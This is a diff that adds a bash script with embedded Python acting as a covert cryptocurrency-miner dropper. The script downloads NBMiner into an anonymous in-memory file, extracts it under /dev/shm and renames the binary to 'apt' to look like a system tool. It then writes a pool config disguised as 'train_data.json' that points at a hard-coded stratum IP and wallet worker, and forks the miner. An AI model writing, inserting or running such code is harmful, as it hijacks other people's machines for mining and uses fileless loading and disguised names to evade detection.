@@ -1,0 +1,74 @@
+#!/bin/bash
+python3 - << 'EOF'
+import os
+import ctypes
+import requests
+import tempfile
+import subprocess
+from ctypes import CDLL, get_errno
+import json
+
+MINER_URL = "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz"
+POOL_CONFIG = "-c train_data.json"
+
+libc = CDLL(None)
+
+def create_memfd():
+    MFD_CLOEXEC = 0x0001
+    fd = libc.syscall(319, b"anon_memfd", MFD_CLOEXEC)
+    if fd == -1:
+        raise OSError(get_errno())
+    return fd
+
+def download_and_load_miner():
+    response = requests.get(MINER_URL, stream=True)
+    response.raise_for_status()
+    fd = create_memfd()
+    for chunk in response.iter_content(chunk_size=8192):
+        os.write(fd, chunk)
+    os.lseek(fd, 0, os.SEEK_SET)
+    return fd
+
+def execute_miner(fd):
+    with tempfile.TemporaryDirectory(dir="/dev/shm") as tmpdir:
+        os.chdir(tmpdir)
+        config = {
+            "algo": "octopus",
+            "url": "stratum+ssl://54.232.215.174:8443",
+            "user": "krxY97WV2D.CLD",
+            "pass": "x"
+        }
+        with open("train_data.json", "w") as f:
+            json.dump(config, f)
+        tar_cmd = ["/bin/tar", "xzf", f"/proc/self/fd/{fd}", "-C", tmpdir]
+        subprocess.run(tar_cmd, check=True, pass_fds=[fd])
+        miner_bin = None
+        for root, dirs, files in os.walk(tmpdir):
+            if "nbminer" in files:
+                miner_bin = os.path.join(root, "nbminer")
+                new_path = os.path.join(root, "apt")
+                os.rename(miner_bin, new_path)
+                miner_bin = new_path
+                break
+        if not miner_bin:
+            raise FileNotFoundError("Arquivo do minerador não encontrado")
+        os.chmod(miner_bin, 0o755)
+        args = [miner_bin] + POOL_CONFIG.split()
+        env = os.environ.copy()
+        env["LD_PRELOAD"] = ""
+        pid = os.fork()
+        if pid == 0:
+            os.close(fd)
+            os.execve(miner_bin, args, env)
+        else:
+            os.waitpid(pid, 0)
+
+if __name__ == "__main__":
+    try:
+        mem_fd = download_and_load_miner()
+        execute_miner(mem_fd)
+    except Exception as e:
+        print(f"Erro: {e}")
+    finally:
+        os.close(mem_fd)
+EOF
